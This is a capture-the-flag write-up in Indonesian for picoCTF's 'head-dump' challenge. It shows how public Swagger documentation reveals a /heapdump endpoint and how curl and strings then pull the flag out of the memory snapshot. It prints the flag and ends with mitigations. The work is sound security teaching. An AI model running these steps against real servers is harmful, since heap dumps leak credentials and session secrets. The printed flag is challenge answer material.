# Writeup: head-dump (Challenge ID: 476)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / API Documentation Reconnaissance & Memory Dump Carving
- **Difficulty:** Easy
- **Author:** picoCTF Team
- **Event:** picoCTF 2025
- **Points:** 50
- **Flag:** `academy{Pat!3nt_15_Th3_K3y_cc0f4fda}`

---

## Problem Statement & Scope
Diberikan sebuah aplikasi blog portal berita "picoCTF News" yang menyediakan dokumentasi antarmuka pemrograman aplikasi (API). Peserta diminta menelusuri aplikasi web, menemukan endpoint tersembunyi yang mengekspos berkas memori internal server (*heap dump*), dan mengekstrak token flag rahasia yang tersimpan di dalam alokasi memori runtime.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Ekspos Dokumentasi API Terbuka (Swagger / OpenAPI Information Disclosure):**
   Antarmuka dokumentasi interaktif seperti Swagger UI (`/api-docs`) memetakan seluruh rute dan skema backend secara komprehensif. Jika rute diagnostik atau administratif dibiarkan publik, penyerang dapat menemukan endpoint sensitif tanpa perlu melakukan *directory brute-forcing*.
2. **Ekspos Endpoint Heap Dump (V8 / Node.js Process Memory Exposure):**
   Endpoint seperti `/heapdump` menghasilkan snapshot memori lengkap dari proses runtime JavaScript/V8. Memori ini menyimpan variabel lingkungan, string konfigurasi aktif, data sesi, dan rahasia aplikasi yang ada di heap.
3. **Ekstraksi Pola Teks dari Citra Biner (Memory Carving / String Search):**
   Meskipun berkas snapshot berbentuk biner mentah (.heapsnapshot), representasi string UTF-8/ASCII tetap tersimpan dalam blok memori yang berdekatan dan dapat dipindai menggunakan pencarian ekspresi reguler.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. Luncurkan instance lab web container:
   `PUT /api/challenges/476/instance/`
2. Kunjungi halaman utama dan temukan tautan dokumentasi API `/api-docs`:
   ```bash
   curl -s http://chatelaine.cylabacademy.net:15705/api-docs
   ```
3. Periksa skema JSON yang diinisialisasi pada berkas JavaScript Swagger UI (`/api-docs/swagger-ui-init.js`):
   ```bash
   curl -s http://chatelaine.cylabacademy.net:15705/api-docs/swagger-ui-init.js | grep -A 10 "/heapdump"
   ```
   Ditemukan endpoint diagnostik:
   ```json
   "/heapdump": {
     "get": {
       "tags": ["Diagnosing"],
       "summary": "Diagnosing the memory allocation.",
       "responses": { "200": { "description": "Returns a memory allocation status." } }
     }
   }
   ```
4. Unduh snapshot memori dari endpoint `/heapdump`:
   ```bash
   curl -s http://chatelaine.cylabacademy.net:15705/heapdump -o heapdump.bin
   ```
5. Ekstrak string flag menggunakan pencarian regex atau perintah `strings`:
   ```bash
   strings heapdump.bin | grep -E "academy\{.*\}|picoCTF\{.*\}"
   # Output:
   # academy{Pat!3nt_15_Th3_K3y_cc0f4fda}
   ```

---

## Flag & Verifikasi
- **Flag:** `academy{Pat!3nt_15_Th3_K3y_cc0f4fda}`
- **Verifikasi:** POST `/api/submissions/` mengembalikan respons `{"correct": true}` (HTTP Status 201).

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Restriksi Akses Endpoint Diagnostik & Profiling:** Endpoint profiling proses seperti heap dump, thread dump, atau actuator metrics (Spring Boot Actuator, Node.js heapdump) harus dinonaktifkan di lingkungan produksi atau diisolasi ketat di balik autentikasi admin tingkat tinggi pada jaringan privat (VPN/localhost).
- **Hardening Dokumentasi Swagger:** Pastikan dokumentasi API yang dipublikasikan secara publik hanya menyertakan endpoint publik yang relevan dan menyaring rute diagnostik atau internal sistem (*route whitelisting*).
